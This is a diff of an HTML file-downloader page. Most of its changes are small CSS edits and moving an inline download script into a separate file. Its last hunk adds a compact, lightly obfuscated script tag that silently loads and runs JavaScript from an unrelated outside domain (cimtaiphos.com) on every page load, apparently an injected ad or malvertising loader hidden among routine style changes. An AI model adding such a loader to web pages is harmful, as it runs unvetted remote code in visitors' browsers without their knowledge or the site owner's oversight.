@@ -9,13 +9,6 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 
     <style>
-        body {
-            font-family: Arial, Helvetica, sans-serif;
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-        }
         main{
             margin: 0;
             padding: 0;
@@ -31,7 +24,7 @@
             padding: 20px;
             width: 40%;
             height: auto;
-            box-shadow: 10px 10px 5px rgba(0, 0, 0, 0.7);
+            box-shadow: 7px 7px 5px rgba(0, 0, 0, 0.7);
             border-radius: 10px;
         }
         h1 {
@@ -65,15 +58,13 @@
             border-radius: 5px;
             color: white;
             background-color: green;
-            font-size: 18px;
-            opacity: 0.8;
+            font-size: 18px;   
             pointer-events: none;
         }
         form button:active {
             background-color: darkred;
         }
         input:valid ~ button{
-            opacity: 1;
             pointer-events: auto;
             cursor: pointer;
         }
@@ -86,7 +77,7 @@
             padding: 20px;
             width: 70%;
             height: auto;
-            box-shadow: 10px 10px 5px rgba(0, 0, 0, 0.7);
+            box-shadow: 7px 7px 5px rgba(0, 0, 0, 0.7);
             border-radius: 10px;
         }
         }
@@ -99,7 +90,7 @@
             padding: 20px;
             width: 100%;
             height: auto;
-            box-shadow: 10px 10px 5px rgba(0, 0, 0, 0.7);
+            box-shadow: 0px 7px 5px rgba(0, 0, 0, 0.7);
             border-radius: 10px;
             }
         }
@@ -140,48 +131,9 @@
     </div>
     </main>
 
-    <script>
-        const fileInput = document.getElementById("fileInput");
-const downloadBtn = document.getElementById("downloadButton");
-
-downloadBtn.addEventListener("click", (e) => {
-    e.preventDefault();
-    const fileUrl = fileInput.value.trim(); // Get the input value and trim whitespace
-    if (fileUrl) {
-        downloadBtn.innerText = "Downloading File...";
-        fetchFile(fileUrl);
-    } else {
-        alert("Please enter a valid URL.");
-    }
-});
-
-function fetchFile(url) {
-    fetch(url)
-        .then((res) => {
-            if (!res.ok) {
-                throw new Error(`HTTP error! status: ${res.status}`);
-            }
-            return res.blob();
-        })
-        .then((file) => {
-            let tempUrl = URL.createObjectURL(file); // Pass the blob to createObjectURL
-            let aTag = document.createElement("a");
-            aTag.href = tempUrl;
-            aTag.download = url.split("/").pop(); // Extract file name from URL
-            document.body.appendChild(aTag);
-            aTag.click();
-            aTag.remove();
-            URL.revokeObjectURL(tempUrl); // Revoke the temporary URL
-            downloadBtn.innerText = "Download File"; // Reset button text
-        })
-        .catch(() => {
-            downloadBtn.innerText = "Download File";
-            alert("Failed to Download File!");
-        });
-}
-
-    </script>
-
+    <script src="page1.js"></script>
     <script src="script.js"></script>
+
+    <script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('cimtaiphos.com',8496811,document.createElement('script'))</script>
 </body>
 </html>
